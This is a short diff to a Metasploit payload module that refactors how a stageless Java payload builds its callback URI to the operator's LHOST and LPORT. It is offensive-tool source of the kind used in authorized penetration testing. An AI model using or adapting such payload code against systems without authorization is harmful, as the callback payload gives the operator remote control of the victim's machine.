@@ -48,23 +48,10 @@ module MetasploitModule
   end
 
   def generate_jar(opts={})
+    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
+    opts[:uri] = generate_uri_uuid_mode(:connect, uri_req_len)
     opts[:stageless] = true
     super(opts)
-  end
-
-  def payload_uri(req=nil)
-    # Default URL length is 30-256 bytes
-    uri_req_len = 30 + luri.length + rand(256 - (30 + luri.length))
-    # Generate the short default URL if we don't know available space
-    if self.available_space.nil?
-      uri_req_len = 5
-    end
-
-    url = "http://#{datastore["LHOST"]}:#{datastore["LPORT"]}#{luri}"
-    # TODO: perhaps wire in an existing UUID from opts?
-    url << generate_uri_uuid_mode(:init_connect, uri_req_len)
-
-    url
   end
 
 end
